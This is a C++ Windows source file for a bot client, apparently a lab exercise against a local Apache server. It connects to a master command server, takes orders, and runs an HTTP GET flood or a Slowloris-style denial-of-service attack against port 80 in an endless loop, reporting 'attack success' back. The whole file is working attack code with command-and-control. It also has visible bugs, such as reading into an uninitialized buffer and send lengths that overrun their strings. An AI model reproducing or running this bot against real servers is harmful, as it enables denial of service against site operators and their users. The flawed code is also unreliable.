/* written by SWING26 hyesong */
/* target in this code : Apache Web Server (set from Autoset 10.7) */

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#undef UNICODE
#include <iostream>
#include <WinSock2.h>
#include <Windows.h>
#include <thread>
#pragma comment(lib, "ws2_32.lib")
using namespace std;

#define BUFF_SIZE 1024
#define DEFAULT_PORT "27015"      // master's port

int main() {
	WSADATA wsa;
	struct hostent *host;
	char command[10];
	const char* url;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
		perror("WSAStart Error ");
		system("pause");
		return -1;
	}

	SOCKET MasterSock = socket(PF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN master_addr;
	SOCKET TargetSock = socket(PF_INET, SOCK_STREAM, 0);
	SOCKADDR_IN target_addr;

	if (MasterSock == INVALID_SOCKET || TargetSock == INVALID_SOCKET) {
		perror("Socket Error ");
		system("pause");
		return -1;
	}

	host = gethostbyname("localhost");

	target_addr.sin_family = AF_INET;
	target_addr.sin_port = htons(80);
	target_addr.sin_addr.s_addr = inet_addr(inet_ntoa(*(struct in_addr*)*host->h_addr_list));

	master_addr.sin_family = AF_INET;
	master_addr.sin_port = htons(atoi(DEFAULT_PORT));
	master_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

	if (connect(MasterSock, (SOCKADDR*)&master_addr, sizeof(master_addr)) == SOCKET_ERROR) {
		cout << "Not Connect with server \n";
		system("pause");
		return 1;
	}

	if (recv(MasterSock, command, (int)strlen(command), 0) == SOCKET_ERROR) {		// command receive
		perror("receive error");
		closesocket(MasterSock);
		WSACleanup();
		return -1;
	}

	if (!strcmp(command, "ping")) {			// ping
		if (send(MasterSock, "pong", 4, 0) == SOCKET_ERROR) {
			perror("send fail");
			closesocket(MasterSock);
			WSACleanup();
			return -1;
		}
	}
	else if (!strcmp(command, "1")) {			  // attack - basic HTTP get flooding
		if (connect(TargetSock, (SOCKADDR*)&target_addr, sizeof(target_addr)) == SOCKET_ERROR) {
			perror("Not Connect with target");
			closesocket(TargetSock);
			WSACleanup();
			return -1;
		}

		while (1) {
			url = "GET / HTTP/1.1\r\nHost: localhostr\r\n\r\n";
			if (send(TargetSock, url, strlen(url), 0) == SOCKET_ERROR) {
				perror("send fail");
				closesocket(TargetSock);
				WSACleanup();
				return -1;
			}

			if (send(MasterSock, "attack success", BUFF_SIZE, 0) == SOCKET_ERROR) {
				perror("attacked success but send fail");
				closesocket(MasterSock);
				WSACleanup();
				return -1;
			}
			Sleep(1000);
		}
	}
	else if (!strcmp(command, "2")) {           // attack - HTTP Slowloris
		if (connect(TargetSock, (SOCKADDR*)&target_addr, sizeof(target_addr)) == SOCKET_ERROR) {
			perror("Not Connect with target");
			closesocket(TargetSock);
			WSACleanup();
			return -1;
		}

		while (1) {
			url = "GET / index.html HTTP / 1.1\r\nHOST: http://127.0.0.1:80\r\nCache-Control: nocache\r\n";
			if (send(TargetSock, url, strlen(url), 0) == SOCKET_ERROR) {
				perror("send fail");
				closesocket(TargetSock);
				WSACleanup();
				return -1;
			}

			if (send(MasterSock, "attack success", 20, 0) == SOCKET_ERROR) {
				perror("attacked success but send fail");
				closesocket(MasterSock);
				WSACleanup();
				return -1;
			}
			Sleep(1000);
		}
	}
	else if (!strcmp(command, "shut")) {			// shut 
		closesocket(MasterSock);
		WSACleanup();
		return 1;
	}
	else {
		cout << "wrong command\n";
	}

	Sleep(1000);

	closesocket(TargetSock);
	closesocket(MasterSock);
	WSACleanup();
	system("pause");

	return 0;
}
